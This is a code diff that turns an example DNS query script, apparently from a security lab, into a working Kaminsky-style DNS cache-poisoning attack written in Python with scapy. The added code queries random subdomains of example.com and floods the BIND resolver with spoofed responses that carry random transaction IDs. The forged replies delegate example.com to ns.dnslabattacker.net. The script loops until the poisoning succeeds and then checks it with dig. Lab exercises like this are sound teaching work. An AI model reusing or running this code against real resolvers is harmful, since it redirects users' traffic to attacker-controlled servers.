@@ -6,12 +6,12 @@ from scapy.all import *
 from random import randint, choice
 from string import ascii_lowercase, digits
 from subprocess import call
-
+import os
 
 parser = argparse.ArgumentParser()
 parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
 parser.add_argument("--port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
-parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int, required=True)
+#parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int, required=True)
 parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
 args = parser.parse_args()
 
@@ -20,7 +20,7 @@ my_ip = args.ip
 # your bind's port (DNS queries are send to this port)
 my_port = args.port
 # BIND's port
-dns_port = args.dns_port
+#dns_port = args.dns_port
 # port that your bind uses to send its DNS queries
 my_query_port = args.query_port
 
@@ -43,17 +43,64 @@ def sendPacket(sock, packet, ip, port):
     sock.sendto(str(packet), (ip, port))
 
 '''
-Example code that sends a DNS query using scapy.
+Pretend to be the NS and send a DNS response to BIND
 '''
-def exampleSendDNSQuery():
+def spoofedDNSResponseFromNS(sock, name):
+    #pretend to send a response from the name server to the BIND server, 
+    #we use a random TXID and set the qname to be the NS.
+    #we also set aa, qr, ancount and nscount to 1 (so that it seems 
+    #like a response from the name server)
+    #Finally we modify the an and ns fields to match the NS
+    #For quick reference of DNS Packet and what fields to set
+    #http://unixwiz.net/techtips/iguide-kaminsky-dns-vuln.html#packet
+    responsePacket = DNS(rd=1, qd=DNSQR(qname=name, qtype = 1), \
+        id = getRandomTXID(), aa = 1, qr=1,  \
+        ancount = 1, nscount = 1)
+
+    responsePacket.an = DNSRR(rrname=name, type=1, ttl=3600, rdata='93.184.216.34')
+    responsePacket.ns = DNSRR(rrname='example.com', type=2, rclass=1,\
+     ttl=3600, rdata='ns.dnslabattacker.net')
+
+    #Send the packet to BIND as a presumed response from the NS
+    sendPacket(sock, responsePacket, my_ip, my_query_port)
+
+'''
+Sends a DNS Query to the BIND server.
+'''
+def sendDNSQuerytoBIND():
+    #generate a non-existing name in example so that the BIND server cannot fetch 
+    #the mapping from its cache and has to send a DNS request to the NS
+    queryName = getRandomSubDomain()+'.example.com.'
+    #print(queryName)
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
-    dnsPacket = DNS(rd=1, qd=DNSQR(qname='example.com'))
+    dnsPacket = DNS(rd=1, qd=DNSQR(qname=queryName))
+    #Send the legitimate request
     sendPacket(sock, dnsPacket, my_ip, my_port)
+    #At the same time, send a flood of fake responses to BIND 
+    #pretending to be the Name Server. We abritrarily send 25 packets 
+    #and hope one of them succeeds
+    flood_count = 25
+    for i in range(flood_count):
+        spoofedDNSResponseFromNS(sock, queryName)
+    #We've got a response from the BIND server.
     response = sock.recv(4096)
     response = DNS(response)
-    print "\n***** Packet Received from Remote Server *****"
+    '''
+    print "\n***** Packet Received from actual BIND Server *****"
     print response.show()
     print "***** End of Remote Server Packet *****\n"
+    '''
+    #response.an contains the answer to our DNS response.
+    #if the response isn't one of our spoofed queries, then the
+    #answer field would be None and we'd have to try again.
+    return response.an
 
 if __name__ == '__main__':
-    exampleSendDNSQuery()
+    #setup a UDP server to get a DNS request over UDP
+    succeeded = False
+    while not succeeded:
+        #send a DNS query to BIND
+        succeeded = sendDNSQuerytoBIND()
+    #verify the cache poisioning worked
+    command = "dig @" + str(my_ip) + " NS example.com -p " + str(my_port)
+    os.system(command)
